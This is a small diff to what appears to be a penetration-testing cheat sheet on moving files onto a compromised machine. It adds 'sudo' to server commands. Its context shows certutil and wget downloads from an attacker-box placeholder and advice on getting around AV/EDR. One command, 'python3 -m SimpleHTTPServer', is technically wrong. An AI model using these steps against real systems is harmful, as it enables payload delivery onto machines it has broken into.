@@ -31,7 +31,7 @@ If you have compromised a machine and are looking to transfer a file to it from 
 
 1) HTTP 
 Host the file on your attack box and turn it into a webserver by opening a terminal in the file's directory and using the command:
-$ python3 -m SimpleHTTPServer 80
+$ sudo python3 -m SimpleHTTPServer 80
 
 Retrieve the file from your attack box from a compromised Windows machine using the command:
 > certutil.exe -urlcache -f http://<ATTACK_BOX_IP>/<FILE_NAME> <NAME_YOU_WANT_FILE_TO_HAVE_ON_WINDOWS_MACHINE>
@@ -45,7 +45,7 @@ $ wget http://<IP_of_ATTACK_BOX>:<PORT>, e.g. 80>/<FILE_NAME>
 If the compromised Windows machine is blocking certutil.exe with its AV/EDR you can try FTP instead.
 Host the file on your attack box and turn it into a FTP server by opening a terminal in the file's directory and using the command:
 
-$ python3 -m pyftpdlib 21
+$ sudo python3 -m pyftpdlib 21
 
 then retrieve it by giving the following command in the Windows machine's CLI:
 
